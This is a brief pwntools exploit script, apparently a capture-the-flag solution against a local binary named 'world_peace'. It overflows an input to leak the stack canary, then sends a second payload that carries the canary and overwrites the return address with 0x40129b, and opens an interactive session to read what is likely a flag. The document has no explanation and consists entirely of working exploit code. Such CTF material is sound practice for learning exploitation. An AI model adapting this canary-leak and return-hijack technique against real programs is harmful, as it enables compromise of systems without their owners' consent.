from pwn import *
context.log_level = 'debug'

p = process('./world_peace')

p.sendline(b'300')

p.recvuntil(b'Say Something:')
p.sendline(b'a'*280)

p.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n')
canary = b'\x00' + p.recv(7)

log.warn(str(canary))

ret_add = p64(0x40129b)
p.sendline(b'a'*(0xa8-0x40) + canary + b'a'*7 * 8 + ret_add)

p.recvuntil(b'ctf')
p.recvline()
p.interactive()